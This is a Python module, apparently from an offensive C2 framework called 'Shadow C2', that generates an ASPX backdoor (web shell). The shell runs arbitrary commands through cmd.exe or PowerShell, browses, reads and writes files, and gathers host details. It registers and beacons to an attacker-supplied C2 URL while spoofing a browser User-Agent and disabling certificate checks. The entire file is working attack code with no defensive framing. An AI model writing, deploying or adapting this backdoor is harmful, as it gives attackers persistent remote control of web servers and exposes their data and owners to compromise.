#!/usr/bin/env python3
"""Shadow C2 — ASP/ASPX Payload Template"""

class ASPRawTemplate:
    def generate(self, c2_url: str, encryption_key: str) -> str:
        return f"""<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Text" %>
<script runat="server">
    // Shadow C2 — ASPX Backdoor
    string c2Url = "{c2_url}";
    string encKey = "{encryption_key}";

    string ExecCmd(string cmd) {{
        try {{
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c " + cmd;
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;
            Process p = Process.Start(psi);
            string output = p.StandardOutput.ReadToEnd();
            output += p.StandardError.ReadToEnd();
            p.WaitForExit();
            return output;
        }} catch(Exception ex) {{
            // Try PowerShell as fallback
            try {{
                ProcessStartInfo psi2 = new ProcessStartInfo();
                psi2.FileName = "powershell.exe";
                psi2.Arguments = "-NoProfile -NonInteractive -Command " + cmd;
                psi2.RedirectStandardOutput = true;
                psi2.UseShellExecute = false;
                psi2.CreateNoWindow = true;
                Process p2 = Process.Start(psi2);
                string out2 = p2.StandardOutput.ReadToEnd();
                p2.WaitForExit();
                return out2;
            }} catch {{ return "[!] Execution failed: " + ex.Message; }}
        }}
    }}

    string HttpPost(string url, string data) {{
        try {{
            WebClient wc = new WebClient();
            wc.Headers.Add("Content-Type", "application/json");
            wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
            ServicePointManager.ServerCertificateValidationCallback = delegate {{ return true; }};
            return wc.UploadString(url, data);
        }} catch {{ return ""; }}
    }}

    protected void Page_Load(object sender, EventArgs e) {{
        string action = Request["_action"] ?? "";
        string output = "";

        switch(action) {{
            case "exec":
                output = ExecCmd(Request["cmd"] ?? "whoami");
                break;
            case "ls":
                string path = Request["path"] ?? @"C:\\";
                StringBuilder sb = new StringBuilder();
                foreach(string d in Directory.GetDirectories(path))
                    sb.AppendLine("[D] " + Path.GetFileName(d));
                foreach(string f in Directory.GetFiles(path))
                    sb.AppendLine("[F] " + Path.GetFileName(f) + " (" + new FileInfo(f).Length + ")");
                output = sb.ToString();
                break;
            case "read":
                output = File.ReadAllText(Request["path"]);
                break;
            case "write":
                File.WriteAllText(Request["path"], Request["content"]);
                output = "[+] Written";
                break;
            case "info":
                output = "Host: " + Environment.MachineName + "\\n";
                output += "OS: " + Environment.OSVersion + "\\n";
                output += "User: " + Environment.UserName + "\\n";
                output += "CLR: " + Environment.Version + "\\n";
                output += "Arch: " + (Environment.Is64BitOperatingSystem ? "x64" : "x86") + "\\n";
                break;
            default:
                // Beacon
                string uuid = Session["uuid"] as string;
                if(string.IsNullOrEmpty(uuid)) {{
                    uuid = Guid.NewGuid().ToString();
                    Session["uuid"] = uuid;
                    string info = "{{\\"uuid\\":\\"" + uuid + "\\",\\"hostname\\":\\"" + Environment.MachineName +
                        "\\",\\"os\\":\\"" + Environment.OSVersion + "\\",\\"arch\\":\\"" +
                        (Environment.Is64BitOperatingSystem ? "x64" : "x86") + "\\",\\"php_version\\":\\"ASPX/.NET\\"}}";
                    HttpPost(c2Url + "/api/register", info);
                }}
                HttpPost(c2Url + "/api/beacon", "{{\\"uuid\\":\\"" + uuid + "\\",\\"timestamp\\":\\"" + DateTime.UtcNow.ToString("o") + "\\"}}");
                break;
        }}

        if(!string.IsNullOrEmpty(output)) {{
            Response.ContentType = "text/plain";
            Response.Write(Convert.ToBase64String(Encoding.UTF8.GetBytes(output)));
        }}
    }}
</script>"""
